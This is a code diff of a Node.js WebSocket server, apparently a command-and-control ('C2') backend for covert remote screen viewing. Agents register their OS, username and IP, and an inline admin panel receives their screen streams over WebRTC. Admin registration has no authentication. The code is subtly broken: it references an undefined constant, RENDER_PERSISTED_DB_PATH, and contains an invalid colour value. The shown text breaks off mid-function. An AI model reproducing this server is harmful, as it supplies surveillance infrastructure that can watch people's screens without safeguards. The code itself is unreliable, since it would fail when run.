@@ -1,59 +1,110 @@
-
 const express = require('express');
 const http = require('http');
 const WebSocket = require('ws');
 const { v4: uuidv4 } = require('uuid');
 const path = require('path');
-const os = require('os');
 const sqlite3 = require('better-sqlite3');
 const fs = require('fs');
+const os = require('os');
 
 // =====================================================
 // DATABASE SETUP
 // =====================================================
 
-// Preserve the database filename: c2.db
+// Keep c2.db in the project root so existing project code that
+// references path.join(__dirname, 'c2.db') continues to work.
 //
-// Local / VPS / Render:
-//   Uses c2.db beside server.js by default.
+// On Render, the actual database file is stored on the Persistent
+// Disk at /var/data/c2.db. A root-level symlink named c2.db points
+// to that file. Attach a Render Persistent Disk at /var/data.
 //
-// Vercel:
-//   Uses /tmp/c2.db if DB_PATH is not configured.
-//   IMPORTANT: Vercel temporary storage is not persistent.
-//
-// Persistent hosting:
-//   Set DB_PATH=/var/data/c2.db (example Render disk).
+// Locally, c2.db remains a normal file beside server.js.
 
-const DB_PATH =
-    process.env.DB_PATH ||
-    (
-        process.env.VERCEL === '1'
-            ? path.join(os.tmpdir(), 'c2.db')
-            : path.join(__dirname, 'c2.db')
-    );
+const IS_RENDER =
+ process.env.RENDER === 'true' ||
+ Boolean(process.env.RENDER_SERVICE_ID);
+
+const ROOT_DB_PATH = path.join(__dirname, 'c2.db');
+const RENDER_PERSISTENT_DB_PATH = '/var/data/c2.db';
+
+let DB_PATH = ROOT_DB_PATH;
 
 try {
-    fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
+ if (IS_RENDER) {
+ // This directory must be the mount path of your Render
+ // Persistent Disk. Without that disk, /var/data is ephemeral.
+ fs.mkdirSync(path.dirname(RENDER_PERSISTED_DB_PATH), {
+ recursive: true
+ });
+
+ // If the persistent database does not exist yet, preserve
+ // the c2.db shipped in the project root by copying it once.
+ if (!fs.existsSync(RENDER_PERSISTENT_DB_PATH)) {
+ let rootIsRegularDatabase = false;
+
+ try {
+ const rootStats = fs.lstatSync(ROOT_DB_PATH);
+ rootIsRegularDatabase =
+ rootStats.isFile() && !rootStats.isSymbolicLink();
+ } catch (error) {
+ if (error.code !== 'ENOENT') throw error;
+ }
+
+ if (rootIsRegularDatabase) {
+ fs.copyFileSync(ROOT_DB_PATH, RENDER_PERSISTENT_DB_PATH);
+ console.log('[DB] Existing root c2.db copied to Render Persistent Disk.');
+ }
+ }
+
+ // Make the root-level c2.db path resolve to the persistent
+ // disk file, preserving compatibility with other project code.
+ try {
+ const rootStats = fs.lstatSync(ROOT_DB_PATH);
+
+ if (rootStats.isSymbolicLink() || rootStats.isFile()) {
+ fs.unlinkSync(ROOT_DB_PATH);
+ } else {
+ throw new Error(
+ 'The project-root c2.db path exists but is not a regular file or symlink.'
+ );
+ }
+ } catch (error) {
+ if (error.code !== 'ENOENT') throw error;
+ }
+
+ fs.symlinkSync(RENDER_PERSISTENT_DB_PATH, ROOT_DB_PATH, 'file');
+
+ // Open the database through its root-level path.
+ DB_PATH = ROOT_DB_PATH;
+
+ console.log(
+ `[DB] Root database path ${ROOT_DB_PATH} is linked to ${RENDER_PERSISTENT_DB_PATH}`
+ );
+ }
+
+ fs.mkdirSync(path.dirname(DB_PATH), { recursive: true });
 } catch (error) {
-    console.error('Database directory creation failed:', error);
-    process.exit(1);
+ console.error('[DB] Database path setup failed:', error);
+ process.exit(1);
 }
 
 let db;
 
 try {
-    db = new sqlite3(DB_PATH);
+ db = new sqlite3(DB_PATH);
 
-    // Database configuration
-    db.pragma('journal_mode = WAL');
-    db.pragma('synchronous = NORMAL');
-    db.pragma('foreign_keys = ON');
-    db.pragma('busy_timeout = 5000');
+ // WAL works on the Render Persistent Disk for a single service
+ // instance. Do not run multiple server instances against this
+ // same SQLite database.
+ db.pragma('journal_mode = WAL');
+ db.pragma('synchronous = NORMAL');
+ db.pragma('foreign_keys = ON');
+ db.pragma('busy_timeout = 5000');
 
-    console.log(`[DB] Connected to: ${DB_PATH}`);
+ console.log(`[DB] Connected to: ${DB_PATH}`);
 } catch (error) {
-    console.error('[DB] Database connection failed:', error);
-    process.exit(1);
+ console.error('[DB] Database connection failed:', error);
+ process.exit(1);
 }
 
 // =====================================================
@@ -61,27 +112,27 @@ try {
 // =====================================================
 
 try {
-    db.exec(`
-        CREATE TABLE IF NOT EXISTS users (
-            id TEXT PRIMARY KEY,
-            os TEXT,
-            arch TEXT,
-            user TEXT,
-            ip TEXT,
-            last_seen INTEGER,
-            status TEXT DEFAULT 'Offline',
-            created_at INTEGER DEFAULT (strftime('%s', 'now'))
-        );
+ db.exec(`
+ CREATE TABLE IF NOT EXISTS users (
+ id TEXT PRIMARY KEY,
+ os TEXT,
+ arch TEXT,
+ user TEXT,
+ ip TEXT,
+ last_seen INTEGER,
+ status TEXT DEFAULT 'Offline',
+ created_at INTEGER DEFAULT (strftime('%s', 'now'))
+ );
 
-        CREATE TABLE IF NOT EXISTS logs (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            message TEXT,
-            timestamp INTEGER DEFAULT (strftime('%s', 'now'))
-        );
-    `);
+ CREATE TABLE IF NOT EXISTS logs (
+ id INTEGER PRIMARY KEY AUTOINCREMENT,
+ message TEXT,
+ timestamp INTEGER DEFAULT (strftime('%s', 'now'))
+ );
+ `);
 } catch (error) {
-    console.error('[DB] Table initialization failed:', error);
-    process.exit(1);
+ console.error('[DB] Table initialization failed:', error);
+ process.exit(1);
 }
 
 // =====================================================
@@ -89,17 +140,17 @@ try {
 // =====================================================
 
 function logDB(msg) {
-    const timestamp = Date.now();
+ const timestamp = Date.now();
 
-    console.log(`[${new Date(timestamp).toISOString()}] ${msg}`);
+ console.log(`[${new Date(timestamp).toISOString()}] ${msg}`);
 
-    try {
-        db.prepare(
-            'INSERT INTO logs (message, timestamp) VALUES (?, ?)'
-        ).run(String(msg), Math.floor(timestamp / 1000));
-    } catch (error) {
-        console.error('[DB LOG ERROR]', error.message);
-    }
+ try {
+ db.prepare(
+ 'INSERT INTO logs (message, timestamp) VALUES (?, ?)'
+ ).run(String(msg), Math.floor(timestamp / 1000));
+ } catch (error) {
+ console.error('[DB LOG ERROR]', error.message);
+ }
 }
 
 logDB('Initializing Database...');
@@ -113,112 +164,117 @@ const app = express();
 const server = http.createServer(app);
 
 const wss = new WebSocket.Server({
-    server,
-    perMessageDeflate: false
+ server,
+ perMessageDeflate: false
 });
 
 app.disable('x-powered-by');
 
 app.get('/health', (req, res) => {
-    res.json({
-        status: 'ok',
-        service: 'screen-connect',
-        database: 'connected',
-        uptime: process.uptime()
-    });
+ res.json({
+ status: 'ok',
+ service: 'screen-connect',
+ database: 'connected',
+ uptime: process.uptime()
+ });
 });
 
 // Prevent public access to the SQLite database and its WAL files.
 app.use((req, res, next) => {
-    let requestPath;
+ let requestPath;
 
-    try {
-        requestPath = decodeURIComponent(req.path);
-    } catch {
-        return res.sendStatus(400);
-    }
+ try {
+ requestPath = decodeURIComponent(req.path);
+ } catch {
+ return res.sendStatus(400);
+ }
 
-    if (/(^|\/)c2\.db(?:-(?:wal|shm))?$/i.test(requestPath)) {
-        return res.sendStatus(404);
-    }
+ if (/(^|\/)c2\.db(?:-(?:wal|shm))?$/i.test(requestPath)) {
+ return res.sendStatus(404);
+ }
 
-    next();
+ next();
 });
 
 // Preserve existing static-file serving.
 app.use(express.static(__dirname, {
-    dotfiles: 'ignore',
-    index: true
+ dotfiles: 'ignore',
+ index: true
 }));
+
+// Serve Admin Panel
+app.get('/', (req, res) => {
+ res.sendFile(path.join(__dirname, 'admin.html'));
+});
 
 // =====================================================
 // WEBSOCKET HELPERS
 // =====================================================
 
 function sendMessage(ws, data) {
-    if (ws && ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify(data));
-        return true;
-    }
+ if (ws && ws.readyState === WebSocket.OPEN) {
+ ws.send(JSON.stringify(data));
+ return true;
+ }
 
-    return false;
+ return false;
 }
 
 function notifyAdmin(adminId, message) {
-    for (const client of wss.clients) {
-        if (
-            client.isAdmin &&
-            client.adminId === adminId &&
-            client.readyState === WebSocket.OPEN
-        ) {
-            sendMessage(client, {
-                type: 'notification',
-                message
-            });
-        }
-    }
+ for (const client of wss.clients) {
+ if (
+ client.isAdmin &&
+ client.adminId === adminId &&
+ client.readyState === WebSocket.OPEN
+ ) {
+ sendMessage(client, {
+ type: 'notification',
+ message
+ });
+ }
+ }
 }
 
 function broadcastToAdmins(sender, msg) {
-    for (const client of wss.clients) {
-        if (
-            client.isAdmin &&
-            client.readyState === WebSocket.OPEN
-        ) {
-            sendMessage(client, msg);
-        }
-    }
+ for (const client of wss.clients) {
+ if (
+ client.isAdmin &&
+ client.readyState === WebSocket.OPEN
+ ) {
+ sendMessage(client, msg);
+ }
+ }
 }
 
 // Find an agent using its actual unique ID,
 // not the randomly generated WebSocket connection ID.
 function findAgentByUniqueID(uniqueId) {
-    for (const client of wss.clients) {
-        if (
-            !client.isAdmin &&
-            client.uniqueId === uniqueId &&
-            client.readyState === WebSocket.OPEN
-        ) {
-            return client;
-        }
-    }
+ for (const client of wss.clients) {
+ if (
+ !client.isAdmin &&
+ client.uniqueId === uniqueId &&
+ client.readyState === WebSocket.OPEN
+ ) {
+ return client;
+ }
+ }
 
-    return null;
+ return null;
 }
 
 function isAgentConnected(uniqueId, excludedClient = null) {
-    for (const client of wss.clients) {
-        if (
-            client !== excludedClient &&
-            !client.isAdmin &&
-            client.uniqueId === uniqueId &&
-            client.readyState === WebSocket.OPEN
-        ) {
-            return true;
-        }
-    }
+ for (const client of wss.clients) {
+ if (
+ client !== excludedClient &&
+ !client.isAdmin &&
+ client.uniqueId === uniqueId &&
+ client.readyState === WebSocket.OPEN
+ ) {
+ return true;
+ }
+ }
 
-    return false;
+ return false;
 }
 
 // =====================================================
@@ -227,247 +283,247 @@ function isAgentConnected(uniqueId, excludedClient = null) {
 
 wss.on('connection', (ws, req) => {
 
-    const clientId = uuidv4().substring(0, 8);
+ const clientId = uuidv4().substring(0, 8);
 
-    ws.id = clientId;
-    ws.isAdmin = false;
-    ws.adminId = null;
-    ws.uniqueId = null;
+ ws.id = clientId;
+ ws.isAdmin = false;
+ ws.adminId = null;
+ ws.uniqueId = null;
 
-    ws.isAlive = true;
+ ws.isAlive = true;
 
-    const remoteAddress = req.socket.remoteAddress || 'Unknown';
+ const remoteAddress = req.socket.remoteAddress || 'Unknown';
 
-    logDB(`[+] WebSocket Connected: ${clientId}`);
+ logDB(`[+] WebSocket Connected: ${clientId}`);
 
-    // -------------------------------------------------
-    // MESSAGE HANDLER
-    // -------------------------------------------------
+ // -------------------------------------------------
+ // MESSAGE HANDLER
+ // -------------------------------------------------
 
-    ws.on('message', (msgRaw) => {
+ ws.on('message', (msgRaw) => {
 
-        try {
-            const data = JSON.parse(msgRaw.toString());
+ try {
+ const data = JSON.parse(msgRaw.toString());
 
-            if (!data || typeof data !== 'object') {
-                return;
-            }
+ if (!data || typeof data !== 'object') {
+ return;
+ }
 
-            // =============================================
-            // ADMIN REGISTRATION
-            // =============================================
+ // =============================================
+ // ADMIN REGISTRATION
+ // =============================================
 
-            if (data.type === 'register_admin') {
+ if (data.type === 'register_admin') {
 
-                ws.isAdmin = true;
-                ws.adminId = clientId;
+ ws.isAdmin = true;
+ ws.adminId = clientId;
 
-                logDB(
-                    `[ADMIN] Connected via port ${req.socket.remotePort}`
-                );
+ logDB(
+ `[ADMIN] Connected via port ${req.socket.remotePort}`
+ );
 
-                notifyAdmin(
-                    clientId,
-                    '🛡️ Admin Session Started'
-                );
+ notifyAdmin(
+ clientId,
+ '🛡️ Admin Session Started'
+ );
 
-                broadcastToAdmins(ws, {
-                    type: 'refresh_users'
-                });
+ broadcastToAdmins(ws, {
+ type: 'refresh_users'
+ });
 
-                return;
-            }
+ return;
+ }
 
-            // =============================================
-            // AGENT INFORMATION / REGISTRATION
-            // =============================================
+ // =============================================
+ // AGENT INFORMATION / REGISTRATION
+ // =============================================
 
-            if (data.type === 'info') {
+ if (data.type === 'info') {
 
-                if (ws.isAdmin) {
-                    return;
-                }
+ if (ws.isAdmin) {
+ return;
+ }
 
-                const uniqueId = String(
-                    data.uniqueId || data.id || ''
-                ).trim();
+ const uniqueId = String(
+ data.uniqueId || data.id || ''
+ ).trim();
 
-                if (!uniqueId || uniqueId.length > 255) {
-                    logDB('[WARN] Invalid agent unique ID');
-                    return;
-                }
+ if (!uniqueId || uniqueId.length > 255) {
+ logDB('[WARN] Invalid agent unique ID');
+ return;
+ }
 
-                // Store the real agent ID on this socket.
-                ws.uniqueId = uniqueId;
+ // Store the real agent ID on this socket.
+ ws.uniqueId = uniqueId;
 
-                const now = Date.now();
+ const now = Date.now();
 
-                const stmt = db.prepare(`
-                    INSERT INTO users (
-                        id,
-                        os,
-                        arch,
-                        user,
-                        ip,
-                        last_seen,
-                        status
-                    )
-                    VALUES (?, ?, ?, ?, ?, ?, 'Online')
+ const stmt = db.prepare(`
+ INSERT INTO users (
+ id,
+ os,
+ arch,
+ user,
+ ip,
+ last_seen,
+ status
+ )
+ VALUES (?, ?, ?, ?, ?, ?, 'Online')
 
-                    ON CONFLICT(id) DO UPDATE SET
-                        last_seen = excluded.last_seen,
-                        status = 'Online',
-                        os = COALESCE(excluded.os, users.os),
-                        arch = COALESCE(excluded.arch, users.arch),
-                        user = COALESCE(excluded.user, users.user),
-                        ip = COALESCE(excluded.ip, users.ip)
-                `);
+ ON CONFLICT(id) DO UPDATE SET
+ last_seen = excluded.last_seen,
+ status = 'Online',
+ os = COALESCE(excluded.os, users.os),
+ arch = COALESCE(excluded.arch, users.arch),
+ user = COALESCE(excluded.user, users.user),
+ ip = COALESCE(excluded.ip, users.ip)
+ `);
 
-                stmt.run(
-                    uniqueId,
-                    data.os || null,
-                    data.arch || null,
-                    data.user || null,
-                    data.ip || remoteAddress,
-                    now
-                );
+ stmt.run(
+ uniqueId,
+ data.os || null,
+ data.arch || null,
+ data.user || null,
+ data.ip || remoteAddress,
+ now
+ );
 
-                logDB(`[AGENT] Online: ${uniqueId}`);
+ logDB(`[AGENT] Online: ${uniqueId}`);
 
-                // Notify connected admins.
-                for (const client of wss.clients) {
+ // Notify connected admins.
+ for (const client of wss.clients) {
 
-                    if (
-                        client.readyState === WebSocket.OPEN &&
-                        client.isAdmin
-                    ) {
-                        sendMessage(client, {
-                            type: 'user_update',
-                            id: uniqueId,
-                            info: data,
-                            lastSeen: now
-                        });
-                    }
-                }
+ if (
+ client.readyState === WebSocket.OPEN &&
+ client.isAdmin
+ ) {
+ sendMessage(client, {
+ type: 'user_update',
+ id: uniqueId,
+ info: data,
+ lastSeen: now
+ });
+ }
+ }
 
-                return;
-            }
+ return;
+ }
 
-            // =============================================
-            // WEBRTC SIGNALING
-            // OFFER / ANSWER / ICE CANDIDATE
-            // =============================================
+ // =============================================
+ // WEBRTC SIGNALING
+ // OFFER / ANSWER / ICE CANDIDATE
+ // =============================================
 
-            if (
-                ['offer', 'answer', 'candidate'].includes(data.type)
-            ) {
+ if (
+ ['offer', 'answer', 'candidate'].includes(data.type)
+ ) {
 
-                if (ws.isAdmin && data.targetId) {
+ if (ws.isAdmin && data.targetId) {
 
-                    // Admin -> Agent
-                    const targetWs = findAgentByUniqueID(
-                        String(data.targetId)
-                    );
+ // Admin -> Agent
+ const targetWs = findAgentByUniqueID(
+ String(data.targetId)
+ );
 
-                    if (
-                        targetWs &&
-                        targetWs.readyState === WebSocket.OPEN
-                    ) {
-                        sendMessage(targetWs, data);
-                    } else {
-                        logDB(
-                            `[WARN] Agent not connected: ${data.targetId}`
-                        );
-                    }
+ if (
+ targetWs &&
+ targetWs.readyState === WebSocket.OPEN
+ ) {
+ sendMessage(targetWs, data);
+ } else {
+ logDB(
+ `[WARN] Agent not connected: ${data.targetId}`
+ );
+ }
 
-                    return;
-                }
+ return;
+ }
 
-                if (!ws.isAdmin && data.targetId === 'admin') {
+ if (!ws.isAdmin && data.targetId === 'admin') {
 
-                    // Agent -> Admin
-                    for (const client of wss.clients) {
+ // Agent -> Admin
+ for (const client of wss.clients) {
 
-                        if (
-                            client.readyState === WebSocket.OPEN &&
-                            client.isAdmin
-                        ) {
-                            sendMessage(client, data);
-                        }
-                    }
+ if (
+ client.readyState === WebSocket.OPEN &&
+ client.isAdmin
+ ) {
+ sendMessage(client, data);
+ }
+ }
 
-                    return;
-                }
-            }
+ return;
+ }
+ }
 
-        } catch (error) {
+ } catch (error) {
 
-            logDB(
-                `[ERR] Message processing error: ${error.message}`
-            );
+ logDB(
+ `[ERR] Message processing error: ${error.message}`
+ );
 
-        }
-    });
+ }
+ });
 
-    // -------------------------------------------------
-    // PONG / CONNECTION HEALTH
-    // -------------------------------------------------
+ // -------------------------------------------------
+ // PONG / CONNECTION HEALTH
+ // -------------------------------------------------
 
-    ws.on('pong', () => {
-        ws.isAlive = true;
-    });
+ ws.on('pong', () => {
+ ws.isAlive = true;
+ });
 
-    // -------------------------------------------------
-    // DISCONNECTION HANDLER
-    // -------------------------------------------------
+ // -------------------------------------------------
+ // DISCONNECTION HANDLER
+ // -------------------------------------------------
 
-    ws.on('close', () => {
+ ws.on('close', () => {
 
-        logDB(`[-] Client Disconnected: ${ws.id}`);
+ logDB(`[-] Client Disconnected: ${ws.id}`);
 
-        // Only update agent records for registered agents.
-        if (!ws.isAdmin && ws.uniqueId) {
+ // Only update agent records for registered agents.
+ if (!ws.isAdmin && ws.uniqueId) {
 
-            const uniqueId = ws.uniqueId;
+ const uniqueId = ws.uniqueId;
 
-            // Don't mark an agent offline if another
-            // active connection uses the same unique ID.
-            if (!isAgentConnected(uniqueId, ws)) {
+ // Don't mark an agent offline if another
+ // active connection uses the same unique ID.
+ if (!isAgentConnected(uniqueId, ws)) {
 
-                try {
-                    db.prepare(`
-                        UPDATE users
-                        SET status = 'Offline',
-                            last_seen = ?
-                        WHERE id = ?
-                    `).run(Date.now(), uniqueId);
+ try {
+ db.prepare(`
+ UPDATE users
+ SET status = 'Offline',
+ last_seen = ?
+ WHERE id = ?
+ `).run(Date.now(), uniqueId);
 
-                    logDB(`[AGENT] Offline: ${uniqueId}`);
+ logDB(`[AGENT] Offline: ${uniqueId}`);
 
-                } catch (error) {
-                    logDB(
-                        `[DB ERR] Disconnect update: ${error.message}`
-                    );
-                }
-            }
-        }
+ } catch (error) {
+ logDB(
+ `[DB ERR] Disconnect update: ${error.message}`
+ );
+ }
+ }
+ }
 
-        // Refresh connected admin dashboards.
-        broadcastToAdmins(ws, {
-            type: 'refresh_users'
-        });
+ // Refresh connected admin dashboards.
+ broadcastToAdmins(ws, {
+ type: 'refresh_users'
+ });
 
-    });
+ });
 
-    // -------------------------------------------------
-    // CONNECTION ERROR
-    // -------------------------------------------------
+ // -------------------------------------------------
+ // CONNECTION ERROR
+ // -------------------------------------------------
 
-    ws.on('error', (error) => {
-        logDB(
-            `[WS ERR] ${ws.id}: ${error.message}`
-        );
-    });
+ ws.on('error', (error) => {
+ logDB(
+ `[WS ERR] ${ws.id}: ${error.message}`
+ );
+ });
 
 });
 
@@ -478,24 +534,24 @@ wss.on('connection', (ws, req) => {
 // Detect disconnected or unresponsive sockets.
 const heartbeat = setInterval(() => {
 
-    for (const ws of wss.clients) {
+ for (const ws of wss.clients) {
 
-        if (ws.isAlive === false) {
-            ws.terminate();
-            continue;
-        }
+ if (ws.isAlive === false) {
+ ws.terminate();
+ continue;
+ }
 
-        ws.isAlive = false;
+ ws.isAlive = false;
 
-        if (ws.readyState === WebSocket.OPEN) {
-            ws.ping();
-        }
-    }
+ if (ws.readyState === WebSocket.OPEN) {
+ ws.ping();
+ }
+ }
 
 }, 30000);
 
 wss.on('close', () => {
-    clearInterval(heartbeat);
+ clearInterval(heartbeat);
 });
 
 // =====================================================
@@ -506,8 +562,8 @@ const PORT = process.env.PORT || 3000;
 
 server.listen(PORT, '0.0.0.0', () => {
 
-    logDB(`C2 Server running on port ${PORT}`);
-    logDB(`Database location: ${DB_PATH}`);
+ logDB(`C2 Server running on port ${PORT}`);
+ logDB(`Database location: ${DB_PATH}`);
 
 });
 
@@ -517,42 +573,452 @@ server.listen(PORT, '0.0.0.0', () => {
 
 server.on('error', (error) => {
 
-    logDB(`[SERVER ERROR] ${error.message}`);
+ logDB(`[SERVER ERROR] ${error.message}`);
 
 });
 
-process.on('SIGTERM', () => {
+let isShuttingDown = false;
 
-    logDB('SIGTERM received. Shutting down...');
+function shutdown(signal) {
+ if (isShuttingDown) return;
+ isShuttingDown = true;
 
-    clearInterval(heartbeat);
+ console.log(`[SERVER] ${signal} received. Shutting down...`);
+ clearInterval(heartbeat);
 
-    wss.close(() => {
-        server.close(() => {
+ // Stop accepting new connections and close existing WebSockets.
+ for (const client of wss.clients) {
+ try {
+ client.terminate();
+ } catch (error) {
+ console.error('[SERVER] WebSocket shutdown error:', error.message);
+ }
+ }
+
+ wss.close(() => {
+ server.close(() => {
+ try {
+ db.close();
+ console.log('[DB] Database connection closed.');
+ } catch (error) {
+ console.error('[DB] Error closing database:', error.message);
+ }
+ process.exit(0);
+ });
+ });
+
+ // Avoid hanging indefinitely if a connection does not close cleanly.
+ setTimeout(() => process.exit(1), 10000).unref();
+}
+
+process.on('SIGTERM', () => shutdown('SIGTERM'));
+process.on('SIGINT', () => shutdown('SIGINT'));
+
+// =====================================================
+// ADMIN PANEL HTML
+// =====================================================
+
+const adminHTML = `
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>C2 Command Center</title>
+    <style>
+        body { background: #0f172a; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
+        h1 { margin-top: 0; font-size: 24px; border-bottom: 1px solid #334155; padding-bottom: 10px; }
+        .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 20px; margin-bottom: 20px; }
+        .card { background: #1e293b; padding: 15px; border-radius: 8px; border: 1px solid #334155; transition: transform 0.2s; position: relative; }
+        .card:hover { transform: translateY(-2px); border-color: #3b82f6; }
+        .btn { background: #3b82f6; color: white; border: none; padding: 10px; width: 100%; cursor: pointer; margin-top: 10px; border-radius: 4px; font-weight: bold; }
+        .btn:hover { background: #2563eb; }
+        .btn.active { background: #10b981; }
+        .btn-force { background: #f59e0b; margin-top: 5px; }
+        .btn-force:hover { background: #d97706; }
+
+        /* Video Modal */
+        #videoModal {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        #videoModal video {
+            width: 80%;
+            max-height: 80%;
+            background: #000;
+            border: 2px solid #3b82f6;
+        }
+        #closeVideo {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background: red;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            cursor: pointer;
+            font-size: 16px;
+            z-index: 1001;
+        }
+
+        /* Logs Container */
+        #logs-container { height: 300px; overflow-y: auto; background: #000; padding: 10px; font-size: 12px; color: #ccc; border: 1px solid #334155; border-radius: 8px; }
+        .log-entry { margin-bottom: 4px; border-bottom: 1px solid #1e293b; padding-bottom: 2px; }
+        .log-time { color: #64748b; margin-right: 8px; }
+        .log-alert-green { color: #4ade80; }
+        .log-alert-red { color: #f87171; }
+        .log-alert-blue { color: #60a5fa; }
+        .log-alert-white { color: #e2e80; }
+
+        /* Status Indicators */
+        .status-dot { height: 10px; width: 10px; border-radius: 50%; display: inline-block; margin-right: 5px; }
+        .status-online { background-color: #4ade80; }
+        .status-offline { background-color: #94a3b8; }
+        .status-connecting { background-color: #fbbf24; }
+
+        .empty-state { text-align: center; color: #64748b; margin-top: 50px; font-style: italic; }
+    </style>
+</head>
+<body>
+    <h1>🛡️ C2 Command Center</h1>
+
+    <!-- User Grid -->
+    <div class="grid" id="userGrid"></div>
+    <div id="emptyState" class="empty-state">Waiting for connections...</div>
+
+    <!-- Live Logs -->
+    <h3>Live Event Log</h3>
+    <div id="logs-container"></div>
+
+    <!-- Video Modal -->
+    <div id="videoModal">
+        <button id="closeVideo" onclick="closeVideo()">Close</button>
+        <video id="remoteVideo" autoplay playsinline></video>
+        <!-- Force Live View Button Inside Frame -->
+        <button class="btn btn-force" style="position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); width: 200px;" onclick="forceLiveViewFromFrame()">🔄 Force Live Stream</button>
+    </div>
+
+    <script>
+        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const host = window.location.host;
+        const wsUrl = \`\${protocol}//\${host}/\`;
+
+        const ws = new WebSocket(wsUrl);
+        let users = {};
+
+        // Store sessions by ID to avoid conflicts
+        let sessions = {};
+        const remoteVideo = document.getElementById('remoteVideo');
+
+        ws.onopen = () => {
+            console.log("Admin connected to C2");
+            ws.send(JSON.stringify({ type: 'register_admin' }));
+            addLog("Connected to C2 Server", "blue");
+        };
+
+        ws.onmessage = (event) => {
             try {
-                db.close();
-            } finally {
-                process.exit(0);
+                const data = JSON.parse(event.data);
+
+                if (data.type === 'registered') {
+                    ws.isAdmin = true;
+                    addLog("Admin Session Registered", "blue");
+                }
+                else if (data.type === 'notification') {
+                    addLog(data.message, data.message.includes('🟢') ? 'green' : 'red');
+                }
+                else if (data.type === 'user_update') {
+                    addLog(\`🟢 New User: \${data.info.os || 'Unknown'} (\${data.info.user || 'Unknown'})\`, 'green');
+
+                    // FIX: Prevent duplicates/spam
+                    if (!users[data.id]) {
+                        users[data.id] = { status: 'Online', logs: [], info: data.info, lastSeen: data.lastSeen, sessionActive: false };
+                    } else {
+                        users[data.id].status = 'Online';
+                        users[data.id].info = data.info;
+                        users[data.id].lastSeen = data.lastSeen;
+                        users[data.id].sessionActive = false;
+                    }
+                    renderUsers();
+                }
+                else if (data.type === 'system') {
+                    addLog(data.message, "blue");
+                }
+                else if (data.type === 'screen_data') {
+                    addLog(\`📺 Screen update from \${data.id}\`, 'blue');
+                    if (!users[data.id]) {
+                        users[data.id] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now(), sessionActive: false };
+                    }
+                    users[data.id].lastSeen = Date.now();
+                    renderUsers();
+                }
+                else if (data.type === 'system_log') {
+                    addLog(data.message, 'white');
+                }
+                else if (data.type === 'offer') {
+                    addLog(\`[SIG] Received Offer from \${data.targetId}\`, 'green');
+                    handleWebRTCOffer(data.sdp, data.targetId);
+                }
+                else if (data.type === 'candidate') {
+                    addLog(\`[SIG] Received Candidate from \${data.targetId}\`, 'blue');
+                    handleWebRTCCandidate(data.candidate, data.targetId);
+                }
+                else if (data.type === 'session_active') {
+                    if (users[data.agentId]) {
+                        users[data.agentId].sessionActive = true;
+                        users[data.agentId].status = 'Online';
+                        renderUsers();
+                        addLog(\`[SESSION] Active session established with \${data.agentId}\`, 'green');
+                    }
+                }
+                else {
+                    if (data.type !== 'registered' && data.type !== 'notification' && data.type !== 'user_update' && data.type !== 'screen_data' && data.type !== 'heartbeat' && data.type !== 'system' && data.type !== 'system_log') {
+                        addLog(\`[\${data.targetId || data.id}] Received: \${data.type}\`, 'blue');
+                        const userId = data.targetId || data.id;
+                        if (!users[userId]) {
+                            users[userId] = { status: 'Online', logs: [], info: {}, lastSeen: Date.now(), sessionActive: false };
+                        }
+                        users[userId].logs.push(data.type);
+                        users[userId].lastSeen = Date.now();
+                        renderUsers();
+                    }
+                }
+            } catch (e) {
+                console.error("Error parsing message:", e);
             }
-        });
-    });
+        };
 
-});
+        function getSession(targetId) {
+            if (!sessions[targetId]) {
+                sessions[targetId] = {
+                    pc: new RTCPeerConnection({
+                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+                    }),
+                    candidates: [] // Queue for early candidates
+                };
 
-process.on('SIGINT', () => {
+                const pc = sessions[targetId].pc;
 
-    logDB('SIGINT received. Shutting down...');
+                // FIX: This ensures the video player actually gets the stream
+                pc.ontrack = (event) => {
+                    remoteVideo.srcObject = event.streams[0];
+                    addLog(\`[VIDEO] Stream received from \${targetId}\`, 'green');
+                    document.getElementById('videoModal').style.display = 'flex';
+                };
 
-    clearInterval(heartbeat);
+                pc.onicecandidate = (event) => {
+                    if (event.candidate) {
+                        ws.send(JSON.stringify({
+                            type: 'candidate',
+                            targetId: targetId,
+                            candidate: event.candidate
+                        }));
+                    }
+                };
 
-    wss.close(() => {
-        server.close(() => {
+                pc.oniceconnectionstatechange = () => {
+                    const state = pc.iceConnectionState;
+                    addLog(\`[ICE] State: \${state} for \${targetId}\`, state === 'connected' ? 'green' : (state === 'failed' ? 'red' : 'blue'));
+                    if (state === 'disconnected' || state === 'failed') {
+                        closeSession(targetId);
+                    }
+                };
+
+                pc.onicegatheringstatechange = () => {
+                    addLog(\`[ICE] Gathering: \${pc.iceGatheringState} for \${targetId}\`, 'blue');
+                };
+            }
+            return sessions[targetId];
+        }
+
+        async function handleWebRTCOffer(offerSDP, targetId) {
+            const session = getSession(targetId);
+            const pc = session.pc;
+
             try {
-                db.close();
-            } finally {
-                process.exit(0);
-            }
-        });
-    });
+                await pc.setRemoteDescription(new RTCSessionDescription(offerSDP));
 
+                // Apply any queued candidates now that we have the remote description
+                while (session.candidates.length > 0) {
+                    const candidate = session.candidates.shift();
+                    await pc.addIceCandidate(new RTCIceCandidate(candidate));
+                }
+
+                const answer = await pc.createAnswer();
+                await pc.setLocalDescription(answer);
+
+                ws.send(JSON.stringify({
+                    type: 'answer',
+                    targetId: targetId,
+                    sdp: pc.localDescription
+                }));
+
+                addLog(\`[SIG] Answer sent to \${targetId}\`, 'green');
+            } catch (err) {
+                addLog(\`[WEBRTC] Error handling offer: \${err.message}\`, 'red');
+            }
+        }
+
+        function handleWebRTCCandidate(candidate, targetId) {
+            const session = getSession(targetId);
+
+            if (session.pc.remoteDescription) {
+                // If remote description is set, add candidate immediately
